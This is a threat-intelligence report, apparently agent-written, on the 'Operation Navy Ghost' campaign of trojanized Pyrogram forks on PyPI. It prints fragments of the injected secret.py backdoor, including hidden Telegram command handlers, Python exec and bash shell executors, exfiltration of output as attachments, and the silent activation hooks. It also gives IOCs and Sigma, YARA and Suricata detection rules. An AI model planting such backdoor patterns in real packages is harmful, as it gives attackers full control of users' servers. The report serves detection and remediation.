# Technical Analysis Report: Operation Navy Ghost -- Malicious PyPI Pyrogram Packages Supply Chain Attack (2026-07-01)

Prepared by: Actioner Research Agent
Classification: TLP:CLEAR
Date: 2026-07-01
Version: 1.1 (REVISED)

## Executive Summary

Between November 2025 and June 2026, a single threat actor conducted a sustained supply chain attack -- dubbed "Operation Navy Ghost" by Checkmarx -- by publishing eight trojanized forks of the legitimate Pyrogram Telegram client library to the Python Package Index (PyPI). The packages (`pyrogram-styled`, `VLifeGram`, `pyrogram-navy`, `VLife-Gram`, `kelragram`, `pyrogram-kelra`, `pyrogram-zeeb`, `sepgram`) accumulated approximately 25,500 total downloads and contained the full, legitimate Pyrogram source code plus an injected backdoor file (`pyrogram/helpers/secret.py`). The backdoor registers hidden Telegram command handlers that grant the attacker arbitrary Python code execution and OS shell access on any server running a Telegram bot built with the compromised library, with exfiltration of large outputs as Telegram document attachments.

The campaign specifically targeted Telegram bot operators in production environments. Once activated, the backdoor gives the attacker complete control of the victim's server -- reading arbitrary files, dumping environment variables and credentials, accessing Telegram sessions and chats, downloading databases, and installing persistent backdoors. The legitimate Pyrogram project (approximately 350,000 monthly downloads, last updated April 2023, 1,400+ GitHub forks) is no longer maintained, making its user base an attractive target for typosquatting and fork-based supply chain attacks. All eight packages have been reported; this report provides concrete package names, attacker Telegram IDs, backdoor code patterns, and behavioral indicators suitable for detection rule generation.

## Background: Pyrogram and the Python Supply Chain

Pyrogram is a popular Python framework for building Telegram MTProto API clients and bots. Its abandonment in April 2023 created a gap that many community forks attempt to fill, providing cover for malicious actors to publish trojanized forks. PyPI does not enforce namespace ownership, allowing anyone to publish packages with names resembling popular libraries. The attacker exploited this by creating packages with plausible "fork" names (e.g., `pyrogram-styled`, `pyrogram-navy`) that developers searching for maintained Pyrogram alternatives might install.

## Attack Timeline (All Times Approximate)

| Timeframe | Event |
|-----------|-------|
| November 2025 | First malicious packages published to PyPI; campaign begins |
| November 2025 -- June 2026 | Eight packages published across three PyPI accounts (`wndrzzka`, `narutorawr18`, `deylin`); packages updated with new versions over time |
| June 2026 | Checkmarx Security Research identifies and discloses the campaign as "Operation Navy Ghost" |
| 2026-06-30 | BleepingComputer publishes public advisory |

## Technical Analysis

### 1. Malicious Packages

| Package Name | Versions | Downloads | PyPI Publisher |
|---|---|---|---|
| `pyrogram-styled` | 16+ | 15,370 | wndrzzka / narutorawr18 |
| `VLifeGram` | 9 | 4,150 | wndrzzka |
| `pyrogram-navy` | 6 | 2,530 | wndrzzka |
| `VLife-Gram` | 5 | 1,030 | deylin |
| `kelragram` | 3 | 1,041 | narutorawr18 |
| `pyrogram-kelra` | 1 | 672 | narutorawr18 |
| `pyrogram-zeeb` | 1 | 432 | unknown |
| `sepgram` | 1 | 264 | unknown |
| **Total** | | **~25,489** | |

All packages are trojanized forks containing the full legitimate Pyrogram source code plus the added `secret.py` backdoor. Despite being published from three different PyPI accounts, researchers attributed the campaign to a single threat actor based on shared `OWNERS` lists, identical backdoor code, consistent command naming conventions, and overlapping infrastructure.

### 2. Backdoor Architecture: `pyrogram/helpers/secret.py`

The backdoor file `secret.py` is placed in the `pyrogram/helpers/` directory -- a location that does not exist in the legitimate Pyrogram package. It implements the following components:

#### Owner/Exclusion List
A hardcoded list of Telegram user IDs that (a) restricts who can issue commands to the backdoor, and (b) deactivates the backdoor on attacker-controlled systems to avoid self-infection:

```python
OWNERS = [842320686, 845521076, 1675073032]
```

An extended set of IDs observed across variants: `1054295664`, `1928772230`, `6710439195`, `984144778`, `1992087933`, `7028669261`, `6321616956`, `278475769`, `1964437366`, `327471892`, `5092757079`, `273057737`, `8721707252`.

#### Initialization Function
The `init()` (or `init_secret()`) function checks whether the running bot's Telegram ID is in the OWNERS list. If it is, the backdoor exits silently. Otherwise, it registers two message handlers:

```python
def init(client: pyrogram.Client):
    if client.me.id in OWNERS:
        return
    client.add_handler(
        pyrogram.handlers.MessageHandler(
            executor,
            pyrogram.filters.command(["asu", "wann"]) &
            pyrogram.filters.user(OWNERS)
        )
    )
    client.add_handler(
        pyrogram.handlers.MessageHandler(
            shellrunner,
            pyrogram.filters.command(["asi", "wann2"]) &
            pyrogram.filters.user(OWNERS)
        )
    )
```

#### Command Handlers

| Command | Alias | Function | Capability |
|---------|-------|----------|------------|
| `/asu` | `/wann` | `executor` / `aexec` | Compiles and executes arbitrary Python code with access to the live Telegram client, sessions, chats, contacts, and environment variables |
| `/asi` | `/wann2` | `shellrunner` / `bash` | Executes arbitrary shell commands via `subprocess.run(["/bin/bash", "-c", cmd])` |

Additional callback query triggers `secretruntime` and `secretforceclose` were observed for runtime control.

#### Python Code Executor
```python
async def aexec(code: str, kwargs: dict = {}) -> object:
    ...
    exec(compile(node, "<string>", "exec"), temp)
    func = await temp[name](*kwargs.values())
    return await func if inspect.iscoroutine(func) else func
```

#### Shell Command Executor
```python
async def bash(cmd: str):
    result = subprocess.run(
        ["/bin/bash", "-c", cmd],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    return result.stdout, result.stderr
```

#### Exfiltration
Output exceeding 4,096 bytes (Telegram's message length limit) is written to a temporary file and sent back to the attacker as a document attachment:

```python
await message.reply_document(
    document=output_filename,
    caption="Command completed."
)
```

### 3. Activation Mechanisms

Two distinct activation paths were observed across the package variants:

**VLifeGram variant** -- Module-load activation:
The backdoor is imported at package import time via a modified `pyrogram/helpers/__init__.py`:
```python
from .secret import init   # malicious line appended
```

**kelragram / pyrogram-navy / pyrogram-styled variants** -- Bot-start activation:
The backdoor is triggered during `Client.start()` in `pyrogram/methods/utilities/start.py`, gated on the bot account check:
```python
try:
    import pyrogram.helpers.secret as secret
    if self.me.is_bot:
        secret.init_secret(self)
except Exception:
    pass
```

The `except Exception: pass` block ensures silent failure -- if the backdoor encounters any error, the bot continues to operate normally, avoiding detection through crashes.

### 4. C2 Channel

The attacker uses Telegram itself as the C2 channel. A Telegram channel `hxxps://TokoWann[.]t[.]me/2` was identified as part of the infrastructure. Commands are sent as Telegram messages to the compromised bot, and results are returned as Telegram messages or document attachments -- all over Telegram's standard encrypted transport, making network-level detection extremely difficult.

### 5. Attribution Indicators

| Indicator | Detail |
|-----------|--------|
| PyPI accounts | `wndrzzka`, `narutorawr18`, `deylin` |
| Email (partial) | `wan****@gmail.com`, `data*******@gmail.com`, `deylin****@gmail.com` |
| Telegram channel | `TokoWann` |
| Single actor assessment | Shared OWNERS lists, identical backdoor code, consistent command naming |

## Indicators of Compromise (IOCs)

> **Defanging Convention:** URLs use `hxxps://`; domains use `[.]`; Telegram IDs, package names, and file paths are shown verbatim for direct matching.

### Package Level

| Package Name | Known Versions | Downloads | Status |
|---|---|---|---|
| `pyrogram-styled` | 16+ versions | 15,370 | Reported |
| `VLifeGram` | 9 versions | 4,150 | Reported |
| `pyrogram-navy` | 6 versions | 2,530 | Reported |
| `VLife-Gram` | 5 versions | 1,030 | Reported |
| `kelragram` | 3 versions | 1,041 | Reported |
| `pyrogram-kelra` | 1 version | 672 | Reported |
| `pyrogram-zeeb` | 1 version | 432 | Reported |
| `sepgram` | 1 version | 264 | Reported |

### File System Indicators

| Path / Pattern | Description |
|---|---|
| `pyrogram/helpers/secret.py` | Backdoor file (does not exist in legitimate Pyrogram) |
| `site-packages/*/pyrogram/helpers/secret.py` | Installed backdoor in Python site-packages |
| Modified `pyrogram/helpers/__init__.py` containing `from .secret import` | Activation injection (VLifeGram variant) |
| Modified `pyrogram/methods/utilities/start.py` containing `import pyrogram.helpers.secret` | Activation injection (other variants) |

### Telegram Indicators (Attacker IDs)

| Type | Value |
|---|---|
| Telegram User ID (Primary) | `842320686` |
| Telegram User ID (Primary) | `845521076` |
| Telegram User ID (Primary) | `1675073032` |
| Telegram User ID (Extended) | `1054295664`, `1928772230`, `6710439195`, `984144778` |
| Telegram User ID (Extended) | `1992087933`, `7028669261`, `6321616956`, `278475769` |
| Telegram User ID (Extended) | `1964437366`, `327471892`, `5092757079`, `273057737`, `8721707252` |
| Telegram Channel | `hxxps://TokoWann[.]t[.]me/2` |

### Behavioral Indicators

| Pattern | Context |
|---|---|
| `exec(compile(` in Python process handling Telegram messages | Dynamic code execution via `/asu` or `/wann` command |
| `subprocess.run(["/bin/bash", "-c", ...])` from Telegram bot process | Shell execution via `/asi` or `/wann2` command |
| Telegram bot sending `reply_document` with large outputs | Data exfiltration of command output > 4096 bytes |
| `filters.command(["asu", "wann"])` in Python source | Backdoor command registration string |
| `filters.command(["asi", "wann2"])` in Python source | Backdoor command registration string |
| `secretruntime` / `secretforceclose` callback strings | Backdoor runtime control triggers |

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1195.002 | Supply Chain Compromise: Compromise Software Supply Chain | Trojanized Pyrogram forks published to PyPI |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | `/asi` / `/wann2` executes arbitrary bash commands via `subprocess.run` |
| T1059.006 | Command and Scripting Interpreter: Python | `/asu` / `/wann` executes arbitrary Python code via `exec(compile())` |
| T1041 | Exfiltration Over C2 Channel | Command output exfiltrated via Telegram `reply_document` |
| T1102 | Web Service | Telegram API abused as bidirectional C2 channel |
| T1204.002 | User Execution: Malicious File | Developers install and use the trojanized package |
| T1036.005 | Masquerading: Match Legitimate Name or Location | Packages named to resemble legitimate Pyrogram forks |
| T1027.009 | Obfuscated Files or Information: Embedded Payloads | Backdoor embedded within legitimate library code |
| T1071.001 | Application Layer Protocol: Web Protocols | C2 communication over Telegram HTTPS API |

## Detection Rules

These detections cover the campaign's durable artifacts: exact package names (Sigma, YARA), the `secret.py` backdoor file path (Sigma, YARA), behavioral shell execution from bot processes (Sigma), the backdoor's code patterns (YARA), and the attacker's Telegram C2 channel (Suricata). All Sigma rules convert cleanly to Splunk and LogScale via `sigma convert`. The YARA rules compile cleanly with `yarac`. The Suricata HTTP rule is structural-only (no live compilation environment available); the TLS SNI variant was dropped (see note below).

### Sigma Rule 1: Pip Install of Malicious Pyrogram Package

<!-- revision: v1.1 -- rewritten pip detection to use CommandLine|contains patterns covering both direct pip and python -m pip invocations; added underscore-normalized package name variants -->

Detects pip install commands targeting known malicious Pyrogram fork package names. Covers direct `pip install` and `python -m pip install` invocations. Includes underscore-normalized variants (e.g., `pyrogram_kelra` alongside `pyrogram-kelra`) because pip normalizes hyphens to underscores. High-fidelity; the package names are unique to this campaign.
**Status:** `sigma convert -t splunk` exit 0; `sigma convert -t log_scale` exit 0 | **Confidence:** HIGH

```yaml
title: Pip Install of Malicious Pyrogram Package
id: 8a3f1c2e-5d7b-4e9a-b6c8-1f2a3d4e5f6a
status: experimental
description: >
    Detects pip install commands targeting known malicious Pyrogram fork packages from
    the Operation Navy Ghost supply chain campaign. Covers direct pip invocation and
    python -m pip usage, with underscore-normalized package name variants.
references:
    - https://www.bleepingcomputer.com/news/security/malicious-pypi-packages-give-hackers-control-of-telegram-bot-servers/
    - https://checkmarx.com/zero-post/operation-navy-ghost-pyrogram-telegram-supplychain-attack/
author: Actioner
date: 2026/07/01
tags:
    - attack.initial_access
    - attack.t1195.002
logsource:
    category: process_creation
    product: linux
detection:
    selection_pip_direct:
        Image|endswith:
            - '/pip'
            - '/pip3'
        CommandLine|contains: 'install'
    selection_pip_module:
        Image|endswith:
            - '/python'
            - '/python3'
        CommandLine|contains|all:
            - '-m'
            - 'pip'
            - 'install'
    selection_package:
        CommandLine|contains:
            - 'vlifegram'
            - 'VLifeGram'
            - 'VLife-Gram'
            - 'VLife_Gram'
            - 'vlife-gram'
            - 'vlife_gram'
            - 'pyrogram-navy'
            - 'pyrogram_navy'
            - 'pyrogram-styled'
            - 'pyrogram_styled'
            - 'pyrogram-zeeb'
            - 'pyrogram_zeeb'
            - 'kelragram'
            - 'sepgram'
            - 'pyrogram-kelra'
            - 'pyrogram_kelra'
    condition: (selection_pip_direct or selection_pip_module) and selection_package
falsepositives:
    - Unlikely, these are known-malicious package names
level: critical
```

### Sigma Rule 2: Pyrogram Backdoor File secret.py Creation

Detects creation of the `secret.py` backdoor file within the pyrogram helpers directory. This file does not exist in the legitimate Pyrogram package.
**Status:** `sigma convert -t splunk` exit 0; `sigma convert -t log_scale` exit 0 | **Confidence:** HIGH

```yaml
title: Pyrogram Backdoor File secret.py Creation
id: 2b4c6d8e-9f0a-1b2c-3d4e-5f6a7b8c9d0e
status: experimental
description: Detects creation of the backdoor file secret.py within the pyrogram helpers directory, as used in Operation Navy Ghost supply chain attack.
references:
    - https://www.bleepingcomputer.com/news/security/malicious-pypi-packages-give-hackers-control-of-telegram-bot-servers/
    - https://checkmarx.com/zero-post/operation-navy-ghost-pyrogram-telegram-supplychain-attack/
author: Actioner
date: 2026/07/01
tags:
    - attack.persistence
    - attack.t1195.002
logsource:
    category: file_event
    product: linux
detection:
    selection:
        TargetFilename|contains: 'pyrogram/helpers/secret.py'
    condition: selection
falsepositives:
    - Custom Pyrogram forks with a legitimately named secret.py helper (very unlikely)
level: high
```

### Sigma Rule 3: Shell Command Execution from Python Telegram Bot Process

<!-- revision: v1.1 -- added ParentCommandLine|contains filter for pyrogram-related strings to narrow overly broad Python-spawns-bash pattern; changed level from medium to low; added hunt query caveat -->

Detects a Python process spawning `/bin/bash -c` where the parent command line references pyrogram-related strings, consistent with the backdoor's shell command handler. **This is a hunt query** -- Python spawning bash is common; the pyrogram/telegram parent filter narrows scope but may still produce false positives.
**Status:** `sigma convert -t splunk` exit 0; `sigma convert -t log_scale` exit 0 | **Confidence:** MEDIUM (hunt query)

```yaml
title: Shell Command Execution from Python Telegram Bot Process
id: 3c5d7e9f-0a1b-2c3d-4e5f-6a7b8c9d0e1f
status: experimental
description: >
    Detects a Python process spawning /bin/bash with a pyrogram-related parent command line,
    consistent with the Operation Navy Ghost backdoor shell command handler (/asi, /wann2)
    executing OS commands via subprocess.run on a compromised Telegram bot server.
    NOTE: This is a hunt query. Python spawning bash is common; the pyrogram filter
    narrows scope but may still produce false positives in development environments.
references:
    - https://www.bleepingcomputer.com/news/security/malicious-pypi-packages-give-hackers-control-of-telegram-bot-servers/
    - https://checkmarx.com/zero-post/operation-navy-ghost-pyrogram-telegram-supplychain-attack/
author: Actioner
date: 2026/07/01
tags:
    - attack.execution
    - attack.t1059.004
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        ParentImage|endswith:
            - '/python'
            - '/python3'
        Image|endswith: '/bash'
        CommandLine|contains: '-c'
    filter_pyrogram:
        ParentCommandLine|contains:
            - 'pyrogram'
            - 'vlifegram'
            - 'kelragram'
            - 'sepgram'
            - 'secret.py'
            - 'telegram'
    condition: selection and filter_pyrogram
falsepositives:
    - Legitimate Python Telegram bot applications that invoke shell commands via subprocess
    - Development and testing environments running Pyrogram-based bots
level: low
```

### YARA Rule 1: Operation Navy Ghost secret.py Backdoor Detection

<!-- revision: v1.1 -- removed standalone ($import_secret or $import_secret2) condition branch; imports now require co-occurrence with at least one campaign-specific indicator ($owner_id*, $cmd_*, $cb_*) -->

Detects the `secret.py` backdoor file based on attacker Telegram IDs, command handler names, callback trigger strings, and behavioral code patterns. Multiple condition branches provide both high-fidelity (attacker ID matching) and behavioral (code pattern) coverage. The import-injection branch now requires co-occurrence with at least one campaign-specific indicator to avoid matching legitimate forks that happen to have a `secret` helper module.
**Status:** `yarac` exit 0 | **Confidence:** HIGH

### YARA Rule 2: Operation Navy Ghost Package Metadata Detection

<!-- revision: v1.1 -- replaced generic "secret.py" with path-qualified "helpers/secret.py" and "pyrogram/helpers/secret"; removed nocase from package name strings (metadata preserves case) -->

Detects malicious Pyrogram fork package archives or installed files containing both a known-malicious package name and references to the secret module backdoor. Package name strings now match case-sensitively (metadata preserves case). The backdoor file indicator uses the path-qualified form `helpers/secret.py` instead of the generic `secret.py` to reduce false positives.
**Status:** `yarac` exit 0 | **Confidence:** HIGH

```yara
rule OperationNavyGhost_SecretPy_Backdoor
{
    meta:
        description = "Detects the secret.py backdoor file injected into malicious Pyrogram forks (Operation Navy Ghost)"
        author = "Actioner"
        date = "2026-07-01"
        reference = "https://checkmarx.com/zero-post/operation-navy-ghost-pyrogram-telegram-supplychain-attack/"
        severity = "CRITICAL"
        revision = "v1.1 -- removed standalone import-only branch; imports now require co-occurrence with campaign indicators"

    strings:
        // Hardcoded attacker Telegram IDs
        $owner_id1 = "842320686" ascii
        $owner_id2 = "845521076" ascii
        $owner_id3 = "1675073032" ascii

        // Command handler names
        $cmd_asu = "\"asu\"" ascii
        $cmd_wann = "\"wann\"" ascii
        $cmd_asi = "\"asi\"" ascii
        $cmd_wann2 = "\"wann2\"" ascii

        // Callback trigger strings
        $cb_runtime = "secretruntime" ascii
        $cb_forceclose = "secretforceclose" ascii

        // Backdoor function patterns
        $handler_reg = "add_handler" ascii
        $exec_compile = "exec(compile(" ascii
        $subprocess_run = "subprocess.run" ascii
        $bin_bash = "/bin/bash" ascii
        $reply_doc = "reply_document" ascii

        // Self-exclusion guard
        $self_exclude = ".me.id" ascii

        // Import pattern from helpers
        $import_secret = "from .secret import" ascii
        $import_secret2 = "import pyrogram.helpers.secret" ascii

    condition:
        filesize < 50KB and
        (
            // Match on attacker IDs (any 2 of 3)
            (2 of ($owner_id*)) or
            // Match on specific command handler names (both pairs)
            ($cmd_asu and $cmd_asi) or
            ($cmd_wann and $cmd_wann2) or
            // Match on callback triggers
            ($cb_runtime and $cb_forceclose) or
            // Match on behavioral pattern: handler + exec + shell + exfil
            ($handler_reg and $exec_compile and ($subprocess_run or $bin_bash) and $reply_doc and $self_exclude) or
            // Match on import injection co-occurring with campaign-specific indicators
            (($import_secret or $import_secret2) and any of ($owner_id*, $cmd_*, $cb_*))
        )
}

rule OperationNavyGhost_Package_Metadata
{
    meta:
        description = "Detects malicious Pyrogram fork package metadata strings (Operation Navy Ghost)"
        author = "Actioner"
        date = "2026-07-01"
        reference = "https://checkmarx.com/zero-post/operation-navy-ghost-pyrogram-telegram-supplychain-attack/"
        severity = "HIGH"
        revision = "v1.1 -- replaced generic secret.py with path-qualified string; removed nocase from package names"

    strings:
        $pkg1 = "VLifeGram" ascii
        $pkg2 = "VLife-Gram" ascii
        $pkg3 = "pyrogram-navy" ascii
        $pkg4 = "pyrogram-styled" ascii
        $pkg5 = "pyrogram-zeeb" ascii
        $pkg6 = "kelragram" ascii
        $pkg7 = "sepgram" ascii
        $pkg8 = "pyrogram-kelra" ascii

        // Secret module backdoor indicators (path-qualified)
        $secret_init = "init_secret" ascii
        $secret_path1 = "helpers/secret.py" ascii
        $secret_path2 = "pyrogram/helpers/secret" ascii

    condition:
        filesize < 500KB and
        any of ($pkg*) and
        ($secret_init or $secret_path1 or $secret_path2)
}
```

### Suricata Rule: Telegram C2 Channel Access (TokoWann)

<!-- revision: v1.1 -- dropped TLS SNI variant (TokoWann is a URI path component, not a hostname; SNI only contains the hostname t.me, never the URI path). Kept HTTP variant only. -->

Detects HTTP traffic to the attacker's Telegram C2 channel `TokoWann`. **The TLS SNI variant from v1.0 has been dropped** because `TokoWann` is a URI path component (`t.me/TokoWann`), not a hostname -- TLS SNI only carries the hostname (`t.me`), so the channel name would never appear in the SNI field. The HTTP variant is retained but **requires TLS inspection** (MITM proxy / SSL bump) to see decrypted HTTP traffic to `t.me`, since Telegram enforces HTTPS.
**Status:** structural check only (no live Suricata compilation) | **Confidence:** LOW

```
# Operation Navy Ghost - Telegram C2 channel indicators
# SID range: 2026070100-2026070109 (local/custom)
# revision: v1.1 -- dropped TLS SNI rule (TokoWann is a URI path component, not a hostname;
#   SNI only contains the hostname t.me). HTTP variant retained but requires TLS inspection
#   (MITM proxy / SSL bump) to see decrypted HTTP traffic to t.me.

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE Operation Navy Ghost - TokoWann Telegram C2 Channel HTTP"; flow:established,to_server; http.host; content:"t.me"; http.uri; content:"TokoWann"; nocase; sid:2026070102; rev:2; metadata:created_at 2026_07_01, severity critical; classtype:trojan-activity; reference:url,checkmarx.com/zero-post/operation-navy-ghost-pyrogram-telegram-supplychain-attack/;)
```

## Impact Assessment

**Breadth:** Moderate -- approximately 25,500 total downloads across eight packages over seven months. The most popular package (`pyrogram-styled`) alone accounted for 15,370 downloads.

**Depth:** Critical per-victim. The backdoor provides the attacker with:
- Arbitrary Python code execution with full access to the running Telegram client
- Arbitrary OS shell command execution
- Access to all Telegram sessions, chats, contacts, and bot tokens
- File system read/write access
- Environment variable and credential theft
- Ability to install persistent backdoors

**Stealth:** High. The backdoor uses Telegram's own encrypted API as its C2 channel, making network-level detection extremely difficult. The `except Exception: pass` wrapper ensures the bot continues operating normally even if the backdoor encounters errors. The self-exclusion guard prevents the attacker's own bots from being compromised.

## Remediation

### Immediate Actions
1. **Audit dependencies:** Search all Python environments for the eight malicious package names:
   ```bash
   pip list 2>/dev/null | grep -iE 'vlifegram|vlife-gram|pyrogram-navy|pyrogram-styled|pyrogram-zeeb|kelragram|sepgram|pyrogram-kelra'
   ```
2. **File system scan:** Search for the backdoor file:
   ```bash
   find / -path '*/pyrogram/helpers/secret.py' 2>/dev/null
   ```
3. **Remove and rebuild:** Uninstall affected packages, rebuild virtual environments from clean requirements
4. **Rotate credentials:** Rotate all Telegram bot tokens, API keys, database credentials, and any secrets accessible from affected servers
5. **Audit Telegram bot activity:** Review bot message history for unexpected `/asu`, `/asi`, `/wann`, `/wann2` commands from unknown user IDs

### Long-Term Hardening
- Pin dependencies with hashes in `requirements.txt` (`pip install --require-hashes`)
- Use SCA/dependency scanning in CI pipelines
- Monitor PyPI for typosquatting of critical dependencies
- Consider using the official Pyrogram or verified maintained forks only
- Restrict outbound network access from bot servers
- Implement process monitoring on production bot servers

## Viability Assessment

This report **passes** the viability gate. The campaign provides:
- Eight concrete, named malicious packages with version and download counts
- Detailed backdoor code with specific function names, command strings, and Telegram IDs
- Clear behavioral patterns (file paths, command handlers, exfiltration mechanism)
- Attribution indicators (PyPI accounts, Telegram channel)
- Multiple detection surfaces (package names, file paths, code patterns, network indicators)

The primary limitation is the absence of cryptographic hashes (SHA256/MD5) for individual package versions -- neither Checkmarx nor BleepingComputer published file hashes. Additionally, network-level detection is inherently limited because the C2 channel uses Telegram's standard encrypted API.

## References

- BleepingComputer: [Malicious PyPI packages give hackers control of Telegram bot servers](https://www.bleepingcomputer.com/news/security/malicious-pypi-packages-give-hackers-control-of-telegram-bot-servers/)
- Checkmarx: [Operation Navy Ghost - Pyrogram Telegram Supply Chain Attack](https://checkmarx.com/zero-post/operation-navy-ghost-pyrogram-telegram-supplychain-attack/)
